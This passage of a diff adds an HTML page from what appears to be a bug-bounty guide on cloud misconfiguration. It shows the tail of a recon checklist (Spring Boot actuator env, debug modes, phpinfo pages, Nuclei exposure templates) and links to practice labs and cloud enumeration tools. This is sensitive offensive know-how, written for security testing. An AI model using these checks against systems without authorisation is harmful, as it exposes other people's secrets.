+</span><span id="__span-21-40"><a id="__codelineno-21-40" name="__codelineno-21-40" href="#__codelineno-21-40"></a>□ Spring Boot /actuator/env → environment variables
+</span><span id="__span-21-41"><a id="__codelineno-21-41" name="__codelineno-21-41" href="#__codelineno-21-41"></a>□ Laravel/Django debug mode → full config exposure
+</span><span id="__span-21-42"><a id="__codelineno-21-42" name="__codelineno-21-42" href="#__codelineno-21-42"></a>□ PHP info pages: phpinfo.php, info.php
+</span><span id="__span-21-43"><a id="__codelineno-21-43" name="__codelineno-21-43" href="#__codelineno-21-43"></a>□ Nuclei: exposures/ + misconfiguration/ templates on all hosts
+</span></code></pre></div>
+</details>
+<hr />
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<div class="grid cards">
+<ul>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17z"/></svg></span> <strong>Practice Labs</strong></p>
+<hr />
+<p>Dedicated AWS and GCP misconfiguration practice environments built around real vulnerability classes.</p>
+<p><a href="http://flaws.cloud"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> flaws.cloud</a>
+<a href="http://flaws2.cloud"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> flaws2.cloud</a>
+<a href="https://thunder-ctf.cloud"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> thunder CTF (GCP)</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m21.71 20.29-1.42 1.42a1 1 0 0 1-1.41 0L7 9.85A3.8 3.8 0 0 1 6 10a4 4 0 0 1-3.78-5.3l2.54 2.54.53-.53 1.42-1.42.53-.53L4.7 2.22A4 4 0 0 1 10 6a3.8 3.8 0 0 1-.15 1l11.86 11.88a1 1 0 0 1 0 1.41M2.29 18.88a1 1 0 0 0 0 1.41l1.42 1.42a1 1 0 0 0 1.41 0l5.47-5.46-2.83-2.83M20 2l-4 2v2l-2.17 2.17 2 2L18 8h2l2-4Z"/></svg></span> <strong>Tools</strong></p>
+<hr />
+<p>Core tools for cloud storage enumeration, IAM analysis, and multi-cloud asset discovery.</p>
+<p><a href="https://github.com/sa7mon/S3Scanner"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> S3Scanner</a>
+<a href="https://github.com/initstring/cloud_enum"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> CloudEnum</a>
+<a href="https://github.com/RhinoSecurityLabs/GCPBucketBrute"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> GCPBucketBrute</a>
+<a href="https://github.com/Sysdig/BlobHunter"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> BlobHunter</a>
+<a href="https://github.com/andresriancho/enumerate-iam"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> enumerate-iam</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 9h5.5L13 3.5zM6 2h8l6 6v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V4c0-1.11.89-2 2-2m.12 13.5 3.74 3.74 1.42-1.41-2.33-2.33 2.33-2.33-1.42-1.41zm11.16 0-3.74-3.74-1.42 1.41 2.33 2.33-2.33 2.33 1.42 1.41z"/></svg></span> <strong>Nuclei Templates</strong></p>
+<hr />
+<p>Community-maintained detection templates for cloud misconfigurations and exposed services.</p>
+<p><a href="https://github.com/projectdiscovery/nuclei-templates/tree/main/cloud"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> nuclei-templates/cloud</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 21.5c-1.35-.85-3.8-1.5-5.5-1.5-1.65 0-3.35.3-4.75 1.05-.1.05-.15.05-.25.05-.25 0-.5-.25-.5-.5V6c.6-.45 1.25-.75 2-1 1.11-.35 2.33-.5 3.5-.5 1.95 0 4.05.4 5.5 1.5 1.45-1.1 3.55-1.5 5.5-1.5 1.17 0 2.39.15 3.5.5.75.25 1.4.55 2 1v14.6c0 .25-.25.5-.5.5-.1 0-.15 0-.25-.05-1.4-.75-3.1-1.05-4.75-1.05-1.7 0-4.15.65-5.5 1.5M12 8v11.5c1.35-.85 3.8-1.5 5.5-1.5 1.2 0 2.4.15 3.5.5V7c-1.1-.35-2.3-.5-3.5-.5-1.7 0-4.15.65-5.5 1.5m1 3.5c1.11-.68 2.6-1 4.5-1 .91 0 1.76.09 2.5.28V9.23c-.87-.15-1.71-.23-2.5-.23q-2.655 0-4.5.84zm4.5.17c-1.71 0-3.21.26-4.5.79v1.69c1.11-.65 2.6-.99 4.5-.99 1.04 0 1.88.08 2.5.24v-1.5c-.87-.16-1.71-.23-2.5-.23m2.5 2.9c-.87-.16-1.71-.24-2.5-.24-1.83 0-3.33.27-4.5.8v1.69c1.11-.66 2.6-.99 4.5-.99 1.04 0 1.88.08 2.5.24z"/></svg></span> <strong>References</strong></p>
+<hr />
+<p>Comprehensive cloud pentesting methodology and a curated AWS security tooling inventory.</p>
+<p><a href="https://cloud.hacktricks.xyz"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> HackTricks Cloud</a>
+<a href="https://github.com/toniblyx/my-arsenal-of-aws-security-tools"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> AWS Security Tools</a></p>
+</li>
+</ul>
+</div>
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <span class="md-tag">cloud</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">aws</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">gcp</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">azure</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">kubernetes</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">misconfiguration</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">bug-bounty</span>
+      
+    
+  </nav>
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-circle-arrow-up" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="m16 12-4-4-4 4M12 16V8"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../part-08-ai-llm/" class="md-footer__link md-footer__link--prev" aria-label="Previous: AI &amp; LLM">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                AI & LLM
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../part-10-mobile/" class="md-footer__link md-footer__link--next" aria-label="Next: Mobile">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Mobile
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-right" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2026 Wellington Vumu
+
+    </div>
+  
+  
+    Made with
+    <a href="https://zensical.org/" target="_blank" rel="noopener">
+      Zensical
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate":null,"base":"..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.footer","navigation.instant","navigation.instant.prefetch","navigation.path","navigation.sections","navigation.top","navigation.tracking","search.highlight"],"search":"../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.dbc0afdc.min.js"></script>
+      
+    
+  </body>
+</html>
